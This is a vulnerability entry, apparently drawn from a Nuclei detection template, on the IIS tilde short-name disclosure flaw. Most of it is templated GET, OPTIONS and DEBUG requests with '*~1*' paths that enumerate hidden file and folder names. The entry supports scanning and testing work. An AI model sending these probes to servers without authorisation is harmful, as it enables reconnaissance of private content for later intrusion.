# Vulnerability: IIS - Short Name Detect
**Classification:** CWE-200
**Source:** Nuclei Template (`iis-shortname-detect.yaml`)

## Description
A website running via IIS on an old .net framework contains a get request vulnerability. Using the the tilde character "~" in the request, an attacker can locate short names of files and folders not normally visible.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}
GET /{{randstring}}*~1*/a.aspx HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8

GET /*~1*/a.aspx HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8

OPTIONS /{{randstring}}*~1*/a.aspx HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8

OPTIONS /*~1*/a.aspx HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8

DEBUG /{{randstring}}*~1*/a.aspx HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8

DEBUG /*~1*/a.aspx HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
```

